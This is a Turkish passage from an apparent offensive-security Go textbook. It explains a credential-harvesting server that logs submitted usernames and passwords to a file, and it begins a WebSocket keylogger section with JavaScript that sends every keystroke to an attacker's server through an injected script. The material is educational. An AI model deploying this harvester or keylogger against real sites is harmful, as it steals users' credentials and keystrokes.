```html
<td class="input"><input name="_user" id="rcmloginuser" required="required"
size="40" autocapitalize="off" autocomplete="off" type="text"></td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required"
size="40" autocapitalize="off" autocomplete="off" type="password"></td>
```

`main()` fonksiyonunuzda, yakaladığınız verileri depolamak için kullanılacak bir dosyayı açarak başlarsınız 0. Ardından, az önce oluşturduğunuz dosya tanıtıcısını (`file handle`) geçirerek `log.SetOutput(io.Writer)` fonksiyonunu kullanır ve `log` paketini çıktısını bu dosyaya yazacak şekilde yapılandırırsınız 0. Sonrasında yeni bir yönlendirici (router) oluşturur ve `login()` handler fonksiyonunu monte edersiniz 0.

Sunucuyu başlatmadan önce, alışık olmayabileceğiniz bir şeyi daha yaparsınız: yönlendiricinize bir dizinden statik dosyalar servis etmesini söylersiniz 0. Böylece Go sunucunuz statik dosyalarınızın—görseller, JavaScript, HTML—nerede bulunduğunu açıkça bilir. Go bunu kolaylaştırır ve dizin geçişi (directory traversal) saldırılarına karşı korumalar sağlar. İçten dışa doğru ilerlersek, dosyaları servis etmek istediğiniz dizini tanımlamak için `http.Dir(string)` kullanırsınız. Bunun sonucu `http.FileServer(FileSystem)` fonksiyonuna girdi olarak verilir ve bu fonksiyon dizininiz için bir `http.Handler` oluşturur. Bunu `PathPrefix(string)` kullanarak yönlendiricinize monte edersiniz. `/` değerini bir yol ön eki (path prefix) olarak kullanmak, henüz eşleşme bulunamamış tüm isteklerle eşleşir. `FileServer` tarafından döndürülen handler’ın varsayılan olarak dizin listelemeyi (directory indexing) desteklediğini unutmayın. Bu, bazı bilgilerin sızmasına neden olabilir. Bunu devre dışı bırakmak mümkündür, ancak burada bunu ele almayacağız.

Son olarak, daha önce yaptığınız gibi, sunucuyu başlatırsınız. Liste 4-8’deki kodu derleyip çalıştırdıktan sonra, web tarayıcınızı açın ve `http://localhost:8080` adresine gidin. Form üzerinden bir kullanıcı adı ve parola göndermeyi deneyin. Ardından terminale dönün, programdan çıkın ve burada gösterildiği gibi `credentials.txt` dosyasını görüntüleyin:

```bash
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0003] login attempt IP_address="127.0.0.1:34040" password="p@ssword1" time="2020-02-13
21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
```

Bu loglara bir bakın! `bob` kullanıcı adını ve `p@ssword1` parolasını gönderdiğinizi görebilirsiniz. Kötü amaçlı sunucunuz formun `POST` isteğini başarıyla işledi, girilen kimlik bilgilerini yakaladı ve çevrimdışı görüntüleme için bir dosyaya kaydetti. Bir saldırgan olarak, bu kimlik bilgilerini hedef organizasyona karşı kullanmayı deneyebilir ve daha ileri düzeyde bir ele geçirme (kompromizasyon) gerçekleştirebilirsiniz.

Bir sonraki bölümde bu kimlik bilgisi toplama tekniğinin bir varyasyonunu inceleyeceksiniz. Form gönderimini beklemek yerine, tuş vuruşlarını gerçek zamanlı yakalamak için bir keylogger oluşturacaksınız.

## WebSocket API ile Keylogging

WebSocket API’si (WebSockets), tam çift yönlü (full duplex) bir protokoldür; yıllar içinde popülerliği artmış ve birçok tarayıcı tarafından desteklenir hale gelmiştir. Web uygulama sunucularının ve istemcilerin birbirleriyle verimli şekilde iletişim kurmasını sağlar. En önemlisi, sunucunun istemciye, istemcinin sunucuyu sürekli yoklamasına (polling) gerek kalmadan mesaj göndermesine imkân tanır.

WebSockets, sohbet ve oyun gibi "gerçek zamanlı" uygulamalar geliştirmek için kullanışlıdır, ancak bunları kötü amaçlar için de kullanabilirsiniz; örneğin, bir kullanıcı tarafından basılan her tuşu yakalamak için bir uygulamaya keylogger enjekte etmek gibi. Başlangıç olarak, ya siteler arası komut dosyası çalıştırma (cross-site scripting, XSS — üçüncü tarafların kurbanın tarayıcısında rastgele JavaScript çalıştırmasına olanak tanıyan bir hata) zafiyetine sahip bir uygulama tespit ettiğinizi ya da bir web sunucusunu ele geçirerek uygulamanın kaynak kodunu değiştirebildiğinizi varsayın. Her iki senaryo da uzak bir JavaScript dosyasını dahil etmenize izin verecektir. Bir istemciden gelen WebSocket bağlantısını işleyebilecek ve gelen tuş vuruşlarını (keystrokes) ele alacak sunucu altyapısını inşa edeceksiniz.

Gösterim amacıyla, yükünüzü (payload) test etmek için JS Bin’i (`http://jsbin.com`) kullanacaksınız. JS Bin, geliştiricilerin HTML ve JavaScript kodlarını test edebilecekleri çevrimiçi bir oyun alanıdır (playground). Tarayıcınızla JS Bin’e gidin ve soldaki sütuna aşağıdaki HTML’yi yapıştırarak varsayılan kodu tamamen değiştirin:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
 <script src='http://localhost:8080/k.js'></script>
  <form action='/login' method='post'>
    <input name='username'/>
    <input name='password'/>
    <input type="submit"/>
  </form>
</body>
</html>
```

Ekranın sağ tarafında render edilmiş (işlenmiş) formu göreceksiniz. Fark etmiş olabileceğiniz gibi, `src` özniteliği `http://localhost:8080/k.js` olarak ayarlanmış bir `script` etiketi eklediniz. Bu, WebSocket bağlantısını oluşturacak ve kullanıcı girdisini sunucuya gönderecek JavaScript kodu olacak.

Sunucunuzun iki şey yapması gerekecek: WebSocket’i işlemek ve JavaScript dosyasını servis etmek. Önce JavaScript işini aradan çıkaralım; sonuçta bu kitap Go hakkında, JavaScript hakkında değil. (Go ile JavaScript yazma talimatları için `https://github.com/gopherjs/gopherjs/` adresine göz atın.) JavaScript kodu burada gösterilmiştir:

```javascript
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
```

JavaScript kodu tuş basma (keypress) olaylarını işler. Her tuşa basıldığında, kod tuş vuruşlarını `ws://{{.}}/ws` adresindeki bir kaynağa (resource) bir WebSocket üzerinden gönderir. `{{.}}` değerinin, bağlı olduğunuz adresi temsil eden bir Go şablon (template) yer tutucusu (placeholder) olduğunu hatırlayın.
